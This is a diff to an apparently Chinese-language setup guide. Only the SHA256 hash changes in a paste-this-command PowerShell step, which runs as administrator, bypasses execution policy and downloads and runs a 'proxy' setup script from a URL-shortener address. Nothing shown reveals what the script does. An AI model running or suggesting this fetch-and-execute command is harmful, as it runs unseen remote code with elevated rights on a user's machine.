@@ -57,7 +57,7 @@ powershell -Exec Bypass -C "$f=$env:TEMP+'\b.ps1';iwr 'https://bjs.r.shortio.cn/
 **先以管理员身份打开 PowerShell**，然后粘贴执行：
 
 ```powershell
-Set-ExecutionPolicy Bypass -Scope Process -Force; $f="$env:TEMP\PS-Setup.ps1"; iwr 'https://bjs.r.shortio.cn/proxy' -Out $f -UseBasicParsing; if ((Get-FileHash $f -Algorithm SHA256).Hash -eq 'AA248A397C02F63FD0256436CC52D9618EA264565415E5EF9C237857432E71C4') { & $f } else { Write-Host 'HASH MISMATCH' -ForegroundColor Red; Pause }
+Set-ExecutionPolicy Bypass -Scope Process -Force; $f="$env:TEMP\PS-Setup.ps1"; iwr 'https://bjs.r.shortio.cn/proxy' -Out $f -UseBasicParsing; if ((Get-FileHash $f -Algorithm SHA256).Hash -eq 'F85FF10BAF4BFD7C91F59842295E10906761699FD47B4E6B8B9CBE547266448F') { & $f } else { Write-Host 'HASH MISMATCH' -ForegroundColor Red; Pause }
 ```
 
 
